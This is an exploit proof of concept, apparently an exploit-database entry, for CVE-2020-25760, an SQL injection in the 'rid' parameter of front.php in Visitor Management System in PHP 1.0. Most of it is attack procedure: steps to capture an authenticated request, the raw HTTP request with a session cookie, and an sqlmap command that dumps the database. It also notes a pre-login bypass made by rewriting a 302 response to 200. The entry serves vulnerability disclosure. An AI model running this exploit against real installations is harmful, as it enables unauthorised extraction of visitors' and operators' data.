# Title: Visitor Management System in PHP 1.0 - Authenticated SQL Injection
# Exploit Author: Rahul Ramkumar
# Date: 2020-09-16
# Vendor Homepage: <https://projectworlds.in>
# Software Link:
<https://projectworlds.in/wp-content/uploads/2020/07/Visitor-Management-System-in-PHP.zip>
# Version: 1.0
# Tested On: Windows 10 Enterprise 1809 (x64_86) + XAMPP 7.2.33-1
# CVE: CVE-2020-25760
# Description
The file front.php does not perform input validation on the 'rid'
parameter. An attacker can append SQL queries to the input to extract
sensitive information from the database.
Note: This exploit can work pre-authentication as well, but need to change
the 302 Response to 200 using an intercept tool. It should be pretty
straight forward so I have not shown how.

#POC

1) Navigate to the login page

Example:

<http://192.168.1.72/visitor_management/index.php>

2) Enter 'username' and 'password'

3) On the homepage, click on any visitor name and intercept the request

4) Save the request to file. Example, visitor_management_sqli.req

GET /visitor_management/front.php?rid=373568 HTTP/1.1
Host: 192.168.1.72
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101
Firefox/78.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: <http://192.168.1.72/visitor_management/front.php>
Cookie: PHPSESSID=emvdv3k52ngs7uf0gliajb13ef
Upgrade-Insecure-Requests: 1

5) Run SQLmap on the file,

sqlmap -r visitor_management_sqli.req --dbms=mysql --threads=10
